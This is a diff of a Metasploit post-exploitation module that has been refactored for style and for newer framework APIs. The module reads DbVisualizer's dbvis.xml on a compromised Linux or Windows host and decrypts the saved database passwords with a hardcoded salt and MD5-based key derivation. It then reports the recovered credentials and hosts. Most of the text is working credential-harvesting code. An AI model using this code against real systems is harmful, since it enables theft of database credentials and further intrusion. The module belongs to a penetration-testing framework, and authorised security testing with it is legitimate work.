@@ -1,54 +1,61 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/auxiliary/report'
 require 'openssl'
 require 'digest/md5'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Multi Gather DbVisualizer Connections Settings',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather DbVisualizer Connections Settings',
+        'Description' => %q{
           DbVisualizer stores the user database configuration in dbvis.xml.
           This module retrieves the connections settings from this file and decrypts the encrypted passwords.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'David Bloom' ], # Twitter: @philophobia78
-        'Platform'      => %w{ linux win },
-        'SessionTypes'  => [ 'meterpreter', 'shell']
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'David Bloom' ], # Twitter: @philophobia78
+        'Platform' => %w{linux win},
+        'SessionTypes' => [ 'meterpreter', 'shell'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_sys_config_getenv
+            ]
+          }
+        }
+      )
+    )
     register_options(
       [
         OptString.new('PASSPHRASE', [false, 'The hardcoded passphrase used for encryption']),
         OptInt.new('ITERATION_COUNT', [false, 'The iteration count used in key derivation', 10])
-      ], super.class)
+      ], super.class
+    )
   end
 
   def run
-
     oldversion = false
 
     case session.platform
-    when /linux/
+    when 'linux'
       user = session.shell_command('whoami').chomp
       print_status("Current user is #{user}")
       if user =~ /root/
         user_base = "/root/"
       else
-         user_base = "/home/#{user}/"
+        user_base = "/home/#{user}/"
       end
       dbvis_file = "#{user_base}.dbvis/config70/dbvis.xml"
-    when /win/
-      if session.type =~ /meterpreter/
+    when 'windows'
+      if session.type == 'meterpreter'
         user_profile = session.sys.config.getenv('USERPROFILE')
       else
         user_profile = cmd_exec("echo %USERPROFILE%").strip
@@ -61,9 +68,9 @@ class Metasploit3 < Msf::Post
       print_status("File not found: #{dbvis_file}")
       print_status('This could be an older version of dbvis, trying old path')
       case session.platform
-      when /linux/
+      when 'linux'
         dbvis_file = "#{user_base}.dbvis/config/dbvis.xml"
-      when /win/
+      when 'windows'
         dbvis_file = user_profile + "\\.dbvis\\config\\dbvis.xml"
       end
       unless file?(dbvis_file)
@@ -111,21 +118,21 @@ class Metasploit3 < Msf::Post
 
   # New config file parse function
   def parse_new_config_file(raw_xml)
-
-    db_table = Rex::Ui::Text::Table.new(
-    'Header'    => "DbVisualizer Databases",
-    'Indent'    => 2,
-    'Columns'   =>
-    [
-      "Alias",
-      "Type",
-      "Server",
-      "Port",
-      "Database",
-      "Namespace",
-      "UserID",
-      "Password"
-    ])
+    db_table = Rex::Text::Table.new(
+      'Header' => "DbVisualizer Databases",
+      'Indent' => 2,
+      'Columns' =>
+      [
+        "Alias",
+        "Type",
+        "Server",
+        "Port",
+        "Database",
+        "Namespace",
+        "UserID",
+        "Password"
+      ]
+    )
 
     dbs = []
     db = {}
@@ -133,7 +140,6 @@ class Metasploit3 < Msf::Post
     version_found = false
     # fetch config file
     raw_xml.each_line do |line|
-
       if version_found == false
         version_found = find_version(line)
       end
@@ -201,7 +207,7 @@ class Metasploit3 < Msf::Post
     dbs.each do |db|
       if ::Rex::Socket.is_ipv4?(db[:Server].to_s)
         print_good("Reporting #{db[:Server]}")
-        report_host(:host =>  db[:Server]);
+        report_host(:host => db[:Server]);
       end
 
       db_table << [ db[:Alias], db[:Type], db[:Server], db[:Port], db[:Database], db[:Namespace], db[:UserID], db[:Password] ]
@@ -218,18 +224,18 @@ class Metasploit3 < Msf::Post
 
   # New config file parse function
   def parse_old_config_file(raw_xml)
-
-    db_table = Rex::Ui::Text::Table.new(
-    'Header'    => 'DbVisualizer Databases',
-    'Indent'    => 2,
-    'Columns'   =>
-    [
-      'Alias',
-      'Type',
-      'URL',
-      'UserID',
-      'Password'
-    ])
+    db_table = Rex::Text::Table.new(
+      'Header' => 'DbVisualizer Databases',
+      'Indent' => 2,
+      'Columns' =>
+      [
+        'Alias',
+        'Type',
+        'URL',
+        'UserID',
+        'Password'
+      ]
+    )
 
     dbs = []
     db = {}
@@ -238,9 +244,8 @@ class Metasploit3 < Msf::Post
 
     # fetch config file
     raw_xml.each_line do |line|
-
       if version_found == false
-         vesrion_found = find_version(line)
+        vesrion_found = find_version(line)
       end
 
       if line =~ /<Database id=/
@@ -248,7 +253,7 @@ class Metasploit3 < Msf::Post
       elsif line =~ /<\/Database>/
         dbfound = false
         # save
-        dbs << db if (db[:Alias] and db[:Url] )
+        dbs << db if (db[:Alias] and db[:Url])
         db = {}
       end
 
@@ -268,7 +273,7 @@ class Metasploit3 < Msf::Post
           db[:UserID] = $1
         end
 
-        #get the user password
+        # get the user password
         if line =~ /<Password>([\S+\s+]+)<\/Password>/i
           enc_password = $1
           db[:Password] = decrypt_password(enc_password)
@@ -291,7 +296,7 @@ class Metasploit3 < Msf::Post
           report_host(:host => server)
         end
       end
-      db_table << [ db[:Alias] , db[:Type] , db[:URL], db[:UserID], db[:Password] ]
+      db_table << [ db[:Alias], db[:Type], db[:URL], db[:UserID], db[:Password] ]
       report_cred(
         ip: server,
         port: '',
@@ -353,11 +358,11 @@ class Metasploit3 < Msf::Post
     iteration_count.times do
       key = Digest::MD5.digest(key)
     end
-    return key[0,8], key[8,8]
+    return key[0, 8], key[8, 8]
   end
 
   def salt
-    [-114,18,57,-100,7,114,111,90].pack('C*')
+    [-114, 18, 57, -100, 7, 114, 111, 90].pack('C*')
   end
 
   def passphrase
@@ -367,5 +372,4 @@ class Metasploit3 < Msf::Post
   def iteration_count
     datastore['ITERATION_COUNT'] || 10
   end
-
 end
